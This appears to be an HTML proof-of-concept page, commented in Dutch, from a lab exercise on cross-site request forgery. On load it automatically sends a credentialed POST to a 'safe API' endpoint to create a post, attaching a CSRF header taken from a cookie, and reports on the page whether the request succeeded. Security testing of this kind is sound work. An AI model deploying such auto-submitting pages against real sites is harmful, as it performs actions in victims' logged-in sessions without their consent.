<html>
<head>
    <meta charset="UTF-8" />
    <title>Attacker - Post Create Post</title>
    <script>
        // Basisconfiguratie voor deze proof-of-concept pagina.
        const website = "https://safe-api.ian-chains.be/";
        const CSRF_COOKIE_NAME = "csrf_token";
        const CSRF_HEADER_NAME = "X-CSRF-Token";

        /**
         * Schrijft een statusbericht naar de pagina en kleurt het resultaat.
         */
        function set_status(message, type) {
            // Stap 1: haal het status-element op.
            const el = document.getElementById('status');
            if (!el) {
                return;
            }

            // Stap 2: toon tekst en visuele feedback.
            el.textContent = message;
            el.style.color = type === 'error' ? '#b91c1c' : '#166534';
        }

        /**
         * Leest het CSRF-token uit de browsercookie.
         */
        function get_csrf_token() {
            // Stap 1: regex-zoekopdracht op de cookie-string.
            const match = document.cookie.match(new RegExp('(?:^|; )' + CSRF_COOKIE_NAME + '=([^;]*)'));

            // Stap 2: decodeer en retourneer, of null als cookie ontbreekt.
            return match ? decodeURIComponent(match[1]) : null;
        }

        /**
         * Probeert automatisch een post te maken met CSRF-header.
         */
        async function create_post() {
            // Stap 1: endpoint bepalen en voortgang tonen.
            const url = website + "posts";
            set_status('Post aanmaken...', 'info');

            try {
                // Stap 2: verstuur POST met CSRF-header + sessiecookie.
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        'Content-Type': "application/x-www-form-urlencoded",
                        [CSRF_HEADER_NAME]: get_csrf_token()
                    },
                    credentials: 'include',
                    body: new URLSearchParams({
                        title: "CSRF Attack Post Safe API",
                        content: "This is the content of the CSRF attack post of the safe API."
                    })
                });

                // Stap 3: parse de response en behandel fouten.
                const result = await response.json();
                if (!response.ok) {
                    console.error('Status:', response.status, 'Error:', result);
                    set_status('Fout bij aanmaken van post (HTTP ' + response.status + ').', 'error');
                    return;
                }

                // Stap 4: succesfeedback tonen.
                console.log('Post created successfully:', result);
                set_status('Post succesvol aangemaakt.', 'success');
                return;
            } catch (error) {
                // Stap 5: netwerkfouten opvangen.
                console.error(error);
                set_status('Netwerkfout: ' + (error.message || String(error)), 'error');
            }
        }

        // Start de actie automatisch bij paginalading.
        window.onload = () => {
            create_post();
        };
    </script>
</head>
<body>
<h1 class="text-3xl font-bold mb-4">Post Create Post</h1>
<p id="status">Wachten op laden...</p>
</body>
</html>
